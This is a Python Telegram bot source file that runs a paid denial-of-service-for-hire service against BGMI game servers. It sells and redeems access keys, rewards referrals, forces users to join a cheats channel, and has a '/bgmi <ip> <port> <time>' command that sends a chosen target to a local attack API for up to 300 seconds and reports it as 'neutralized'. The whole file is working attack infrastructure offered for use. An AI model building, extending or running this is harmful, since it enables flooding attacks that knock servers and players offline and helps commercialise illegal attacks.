import telebot
import json
import requests
import datetime
import os
import time
import psutil
import socket
import threading
import random
import string

# - Load Config (Admin ID aur Token)
if os.path.exists('config.json'):
    with open('config.json') as f:
        config = json.load(f)
else:
    print("Error: config.json file nahi mili!")
    print('{"token": "YOUR_BOT_TOKEN", "admin": "8431832605", "channel": "BGMI_CHEATS_SETUP"}')
    exit()

bot = telebot.TeleBot(config['token'])
API_URL = "http://127.0.0.1:8080/hit" 
AUTH_TOKEN = "DRX_POWER_ULTRA_V4"

# Single channel to join
REQUIRED_CHANNEL = config.get('channel', 'BGMI_CHEATS_SETUP').replace('@', '')

# Database files
KEYS_FILE = "keys.json"
USERS_FILE = "users.json"
REFERRAL_FILE = "referrals.json"

def load_data(file):
    if os.path.exists(file):
        with open(file, 'r') as f: return json.load(f)
    return {}

def save_data(file, data):
    with open(file, 'w') as f: json.dump(data, f, indent=4)

def check_channel(user_id):
    """Check if user has joined the required channel"""
    if not REQUIRED_CHANNEL:
        return True
    
    try:
        member_status = bot.get_chat_member(f"@{REQUIRED_CHANNEL}", user_id).status
        if member_status in ['member', 'administrator', 'creator']:
            return True
        else:
            return False
    except Exception as e:
        print(f"Channel check error: {e}")
        return False

def generate_oggy_key(duration, custom_name=None):
    """Generate OGGY style key"""
    if custom_name:
        prefix = custom_name.upper()
    else:
        prefix = "OGGY"
    
    suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
    key = f"{prefix}-{suffix}"
    
    keys = load_data(KEYS_FILE)
    keys[key] = {
        "duration": duration,
        "created_by": "admin",
        "created_at": datetime.datetime.now().isoformat(),
        "used_by": None
    }
    save_data(KEYS_FILE, keys)
    return key

# - Commands Logic
@bot.message_handler(commands=['start'])
def welcome(m):
    user_id = m.from_user.id
    text = m.text.split()
    
    # Check channel join FIRST
    if REQUIRED_CHANNEL and not check_channel(user_id):
        keyboard = telebot.types.InlineKeyboardMarkup()
        join_btn = telebot.types.InlineKeyboardButton(
            "📢 JOIN CHANNEL", 
            url=f"https://t.me/{REQUIRED_CHANNEL}"
        )
        check_btn = telebot.types.InlineKeyboardButton("✅ CHECK JOINED", callback_data="check_channel")
        keyboard.add(join_btn)
        keyboard.add(check_btn)
        
        bot.reply_to(
            m,
            f"⚠️ **CHANNEL JOIN REQUIRED** ⚠️\n\n"
            f"🔰 Please join our channel first:\n"
            f"👉 @{REQUIRED_CHANNEL}\n\n"
            f"After joining, click the CHECK button.\n\n"
            f"🔥 Channel mein aao phir bot use kar sakte ho!",
            reply_markup=keyboard,
            parse_mode="Markdown"
        )
        return
    
    # Check if this is a referral link
    is_referral = False
    referrer_id = None
    
    if len(text) > 1 and text[1].startswith('ref_'):
        ref_code = text[1].replace('ref_', '')
        is_referral = True
        
        # Find referrer by code
        referrals = load_data(REFERRAL_FILE)
        for uid, data in referrals.items():
            if data.get('code') == ref_code:
                referrer_id = uid
                break
    
    # Process referral if valid and not self-referral
    if is_referral and referrer_id and str(referrer_id) != str(user_id):
        referrals = load_data(REFERRAL_FILE)
        user_id_str = str(user_id)
        referrer_id_str = str(referrer_id)
        
        # Initialize referrer if not exists
        if referrer_id_str not in referrals:
            referrals[referrer_id_str] = {
                "code": f"OGGY{referrer_id_str[-6:]}",
                "referrals_count": 0,
                "referred_users": [],
                "reward_claimed": False
            }
        
        # Check if this user already referred
        if user_id_str not in referrals[referrer_id_str]['referred_users']:
            referrals[referrer_id_str]['referrals_count'] += 1
            referrals[referrer_id_str]['referred_users'].append(user_id_str)
            save_data(REFERRAL_FILE, referrals)
            
            # Notify referrer
            try:
                bot.send_message(
                    int(referrer_id_str),
                    f"🎉 **New Referral!** 🎉\n\n"
                    f"✅ Someone joined using your link!\n"
                    f"📊 Total referrals: {referrals[referrer_id_str]['referrals_count']}/3\n\n"
                    f"💡 Get 3 referrals for 2 hours FREE access!\n"
                    f"Use /referral to check status."
                )
            except:
                pass
    
    # Main welcome message
    welcome_text = (
        f"🔥 **OGGY POWER BOT** 🔥\n\n"
        f"👋 Welcome {m.from_user.first_name}!\n\n"
        f"📌 **How to get access:**\n"
        f"🔑 Use /redeem with a valid key\n"
        f"👥 Get 3 referrals using /referral\n"
        f"💰 Contact admin to purchase\n\n"
        f"📱 Use /help for all commands"
    )
    
    bot.reply_to(m, welcome_text, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "check_channel")
def check_channel_callback(call):
    user_id = call.from_user.id
    
    if check_channel(user_id):
        bot.edit_message_text(
            "✅ **VERIFIED!** ✅\n\n"
            f"You have joined @{REQUIRED_CHANNEL}!\n"
            "Now you can use the bot.",
            call.message.chat.id,
            call.message.message_id
        )
        # Send welcome message
        welcome(call.message)
    else:
        bot.answer_callback_query(
            call.id, 
            f"❌ You haven't joined @{REQUIRED_CHANNEL} yet!\nPlease join first.", 
            show_alert=True
        )

@bot.message_handler(commands=['help'])
def help_cmd(m):
    help_text = """
🚀 **OGGY POWER BOT COMMANDS** 🚀

**⚔️ Attack Commands:**
/bgmi <ip> <port> <time> - Start OGGY Attack

**👤 Account Commands:**
/redeem <key> - Activate your plan
/myinfo - Check your plan details
/referral - Get referral link & track
/status - Bot & API status

**👑 Admin Commands:**
/genkey <duration> [name] - Generate OGGY key

**🎁 Referral Reward:**
Get 3 referrals = 2 hours FREE access!

💎 **Need Help?** Contact @admin
    """
    bot.reply_to(m, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['genkey'])
def genkey(m):
    if str(m.from_user.id) != str(config['admin']):
        return bot.reply_to(m, "❌ Admin only command.")
    
    args = m.text.split()
    if len(args) < 2:
        return bot.reply_to(m, "Usage: /genkey <duration> [custom_name]\n\nExamples:\n/genkey 2h\n/genkey 1d OGGY-PRO\n/genkey 30min VIP")
    
    duration = args[1]
    custom_name = args[2] if len(args) > 2 else None
    
    key = generate_oggy_key(duration, custom_name)
    bot.reply_to(
        m, 
        f"🔑 **OGGY KEY GENERATED** 🔑\n\n"
        f"**Key:** `{key}`\n"
        f"**Duration:** {duration}\n"
        f"**Style:** OGGY Custom\n\n"
        f"Share this key with users!"
    )

@bot.message_handler(commands=['redeem'])
def redeem(m):
    user_id = str(m.from_user.id)
    
    # Check channel join
    if REQUIRED_CHANNEL and not check_channel(int(user_id)):
        return bot.reply_to(m, f"❌ Please join @{REQUIRED_CHANNEL} first!\nUse /start to get join link.")
    
    args = m.text.split()
    if len(args) < 2:
        return bot.reply_to(m, "❌ Usage: `/redeem OGGY-XXXXXX`", parse_mode="Markdown")
    
    user_key = args[1].upper()
    keys = load_data(KEYS_FILE)
    
    if user_key in keys:
        key_data = keys[user_key]
        
        # Check if key already used
        if key_data.get('used_by'):
            return bot.reply_to(m, "❌ This key has already been used!")
        
        duration = key_data['duration']
        users = load_data(USERS_FILE)
        
        # Calculate expiry
        now = datetime.datetime.now()
        if 'h' in duration:
            hours = int(duration.replace('h', ''))
            expiry = now + datetime.timedelta(hours=hours)
        elif 'd' in duration:
            days = int(duration.replace('d', ''))
            expiry = now + datetime.timedelta(days=days)
        elif 'min' in duration:
            mins = int(duration.replace('min', ''))
            expiry = now + datetime.timedelta(minutes=mins)
        else:
            expiry = now + datetime.timedelta(hours=1)
        
        users[user_id] = {
            "plan": duration,
            "active": True,
            "redeemed_at": now.isoformat(),
            "expiry": expiry.isoformat(),
            "used_key": user_key
        }
        save_data(USERS_FILE, users)
        
        # Mark key as used
        key_data['used_by'] = user_id
        key_data['used_at'] = now.isoformat()
        keys[user_key] = key_data
        save_data(KEYS_FILE, keys)
        
        bot.reply_to(
            m, 
            f"✅ **OGGY KEY REDEEMED!** ✅\n\n"
            f"🎉 Plan Activated: {duration}\n"
            f"📅 Expires: {expiry.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"🔥 Start attacking with /bgmi"
        )
    else:
        bot.reply_to(m, "❌ Invalid OGGY Key!\n\nUse /genkey to create valid keys (admin only)")

@bot.message_handler(commands=['referral'])
def referral_cmd(m):
    user_id = str(m.from_user.id)
    
    # Check channel join
    if REQUIRED_CHANNEL and not check_channel(int(user_id)):
        return bot.reply_to(m, f"❌ Please join @{REQUIRED_CHANNEL} first!\nUse /start to get join link.")
    
    referrals = load_data(REFERRAL_FILE)
    bot_username = bot.get_me().username
    
    # Initialize user referral data if not exists
    if user_id not in referrals:
        referrals[user_id] = {
            "code": f"OGGY{user_id[-6:]}",
            "referrals_count": 0,
            "referred_users": [],
            "reward_claimed": False
        }
        save_data(REFERRAL_FILE, referrals)
    
    user_ref = referrals[user_id]
    referral_link = f"https://t.me/{bot_username}?start=ref_{user_ref['code']}"
    
    # Check if user can claim reward
    can_claim = user_ref['referrals_count'] >= 3 and not user_ref['reward_claimed']
    
    ref_text = (
        f"🔗 **OGGY REFERRAL SYSTEM** 🔗\n\n"
        f"👤 **Your Referral Code:** `{user_ref['code']}`\n"
        f"📊 **Referrals:** {user_ref['referrals_count']}/3\n"
        f"✅ **Reward Claimed:** {'Yes' if user_ref['reward_claimed'] else 'No'}\n\n"
        f"🔗 **Your Referral Link:**\n"
        f"`{referral_link}`\n\n"
        f"🎁 **Reward:** Get 3 referrals = 2 hours FREE access!\n\n"
        f"💡 **How it works:**\n"
        f"• Share your link with friends\n"
        f"• When they click and start bot, you get +1 referral\n"
        f"• Get 3 referrals to claim 2 hours free\n\n"
        f"📤 **Share now:**\n"
        f"Copy and send this link to friends!"
    )
    
    keyboard = telebot.types.InlineKeyboardMarkup()
    
    # Share button
    share_btn = telebot.types.InlineKeyboardButton(
        "📤 Share Link", 
        url=f"https://t.me/share/url?url={referral_link}&text=🔥 Join OGGY Power Bot and get free BGMI attacks! 🔥"
    )
    keyboard.add(share_btn)
    
    if can_claim:
        claim_btn = telebot.types.InlineKeyboardButton("🎁 Claim 2 Hours FREE", callback_data="claim_reward")
        keyboard.add(claim_btn)
    
    bot.reply_to(m, ref_text, reply_markup=keyboard, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "claim_reward")
def claim_reward(call):
    user_id = str(call.from_user.id)
    referrals = load_data(REFERRAL_FILE)
    
    if user_id not in referrals:
        return bot.answer_callback_query(call.id, "Error: No referral data found!")
    
    user_ref = referrals[user_id]
    
    if user_ref['referrals_count'] >= 3 and not user_ref['reward_claimed']:
        # Grant 2 hours free access
        users = load_data(USERS_FILE)
        now = datetime.datetime.now()
        expiry = now + datetime.timedelta(hours=2)
        
        users[user_id] = {
            "plan": "2 hours (Referral Reward)",
            "active": True,
            "redeemed_at": now.isoformat(),
            "expiry": expiry.isoformat(),
            "source": "referral"
        }
        save_data(USERS_FILE, users)
        
        # Mark reward as claimed
        user_ref['reward_claimed'] = True
        referrals[user_id] = user_ref
        save_data(REFERRAL_FILE, referrals)
        
        bot.edit_message_text(
            f"🎉 **REWARD CLAIMED!** 🎉\n\n"
            f"✅ 2 hours of FREE access activated!\n"
            f"📅 Expires: {expiry.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"🔥 Use /bgmi to start attacking!",
            call.message.chat.id,
            call.message.message_id,
            parse_mode="Markdown"
        )
    else:
        needed = 3 - user_ref['referrals_count']
        bot.answer_callback_query(call.id, f"You need {needed} more referrals! Get 3 referrals for 2 hours free.")

@bot.message_handler(commands=['bgmi'])
def attack(m):
    user_id = str(m.from_user.id)
    
    # Check channel join
    if REQUIRED_CHANNEL and not check_channel(int(user_id)):
        return bot.reply_to(m, f"❌ Please join @{REQUIRED_CHANNEL} first!\nUse /start to get join link.")
    
    users = load_data(USERS_FILE) 
    
    if user_id not in users or not users[user_id].get('active'):
        return bot.reply_to(
            m, 
            "❌ **ACCESS DENIED!**\n\n"
            "No active plan found.\n\n"
            "🔑 Use /redeem with a valid key\n"
            "👥 Or get 3 referrals with /referral\n"
            "💰 Or contact admin to purchase"
        )
    
    # Check expiry
    expiry_str = users[user_id].get('expiry')
    if expiry_str:
        expiry = datetime.datetime.fromisoformat(expiry_str)
        if datetime.datetime.now() > expiry:
            users[user_id]['active'] = False
            save_data(USERS_FILE, users)
            return bot.reply_to(m, "❌ Your plan has expired! Use /redeem for new key.")
    
    args = m.text.split()
    if len(args) != 4: 
        return bot.reply_to(m, "❌ **Format:** `/bgmi <IP> <PORT> <TIME>`\nExample: `/bgmi 1.1.1.1 80 60`", parse_mode="Markdown")
    
    ip, port, attack_time = args[1], args[2], args[3]
    
    # Validate time
    try:
        time_int = int(attack_time)
        if time_int > 300:
            return bot.reply_to(m, "❌ Maximum attack time is 300 seconds!")
        if time_int < 10:
            return bot.reply_to(m, "❌ Minimum attack time is 10 seconds!")
    except:
        return bot.reply_to(m, "❌ Time must be a number!")
    
    try:
        response = requests.get(f"{API_URL}?token={AUTH_TOKEN}&ip={ip}&port={port}&time={attack_time}", timeout=10)
        
        if response.status_code == 200:
            bot.reply_to(
                m, 
                f"🔥 **OGGY ATTACK STARTED!** 🔥\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"🎯 Target: `{ip}:{port}`\n"
                f"🕒 Time: {attack_time}s\n"
                f"💎 Power: OGGY ULTRA\n"
                f"👑 Mode: OGGY POWER\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ Attack is in progress!",
                parse_mode="Markdown"
            )
            
            def send_finish():
                bot.send_message(
                    m.chat.id, 
                    f"✅ **OGGY ATTACK FINISHED** ✅\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"🎯 Target: `{ip}:{port}`\n"
                    f"💥 Status: Target Neutralized\n"
                    f"━━━━━━━━━━━━━━━━━━━━",
                    parse_mode="Markdown"
                )
            
            threading.Timer(int(attack_time), send_finish).start()
        else:
            bot.reply_to(m, "❌ **API ERROR!**\nServer responded with an error.")
            
    except Exception as e:
        bot.reply_to(m, f"❌ **CONNECTION ERROR!**\nAPI server is offline.\nError: {str(e)}")

@bot.message_handler(commands=['myinfo'])
def myinfo(m):
    user_id = str(m.from_user.id)
    
    # Check channel join
    if REQUIRED_CHANNEL and not check_channel(int(user_id)):
        return bot.reply_to(m, f"❌ Please join @{REQUIRED_CHANNEL} first!\nUse /start to get join link.")
    
    users = load_data(USERS_FILE)
    
    # Get referral info
    referrals = load_data(REFERRAL_FILE)
    ref_count = 0
    if user_id in referrals:
        ref_count = referrals[user_id]['referrals_count']
    
    if user_id in users and users[user_id].get('active'):
        expiry_str = users[user_id].get('expiry')
        if expiry_str:
            expiry = datetime.datetime.fromisoformat(expiry_str)
            remaining = expiry - datetime.datetime.now()
            hours_left = remaining.total_seconds() / 3600
            minutes_left = remaining.total_seconds() / 60
            
            bot.reply_to(
                m, 
                f"👤 **OGGY USER INFO**\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"📋 **Plan:** {users[user_id]['plan']}\n"
                f"⏰ **Status:** Active ✅\n"
                f"📅 **Expires:** {expiry.strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"⌛ **Time Left:** {minutes_left:.0f} minutes ({hours_left:.1f} hours)\n"
                f"👥 **Referrals:** {ref_count}/3\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"💪 Keep attacking with /bgmi",
                parse_mode="Markdown"
            )
        else:
            bot.reply_to(m, f"👤 **Plan:** {users[user_id]['plan']}\n**Status:** Active ✅\n**Referrals:** {ref_count}/3")
    else:
        bot.reply_to(
            m, 
            f"❌ **No active plan found.**\n\n"
            f"👥 **Your Referrals:** {ref_count}/3\n\n"
            f"🔑 Use /redeem OR\n"
            f"👥 Get 3 referrals with /referral"
        )

@bot.message_handler(commands=['status'])
def status(m):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    try:
        s.connect(('127.0.0.1', 8080))
        api_status = "Online 🟢"
        s.close()
    except:
        api_status = "Offline 🔴"

    cpu_usage = psutil.cpu_percent(interval=1)
    ram_usage = psutil.virtual_memory().percent
    load_icon = "🟢" if cpu_usage < 50 else "🟡" if cpu_usage < 80 else "🔴"
    
    # Count active users
    users = load_data(USERS_FILE)
    active_users = sum(1 for u in users.values() if u.get('active', False))
    
    # Count total referrals
    referrals = load_data(REFERRAL_FILE)
    total_refs = sum(r.get('referrals_count', 0) for r in referrals.values())
    
    status_text = (
        "🔥 **OGGY POWER STATUS** 🔥\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"🤖 **Bot Name:** OGGY POWER\n"
        f"🔌 **API Status:** {api_status}\n"
        f"👥 **Active Users:** {active_users}\n"
        f"📊 **Total Referrals:** {total_refs}\n"
        f"🖥️ **CPU Load:** {cpu_usage}% {load_icon}\n"
        f"💾 **RAM Usage:** {ram_usage}%\n"
        f"🚀 **Server:** ULTRA OPTIMIZED\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"💎 **OGGY MODE:** OGGY POWER"
    )
    bot.reply_to(m, status_text, parse_mode="Markdown")

print("🔥 OGGY POWER BOT STARTED 🔥")
print(f"Bot Username: @{bot.get_me().username}")
print(f"Required Channel: @{REQUIRED_CHANNEL}")
print("Features: OGGY Keys | Referral System | Auto Tracking")
print("\n✅ Bot is running...")

bot.polling(none_stop=True)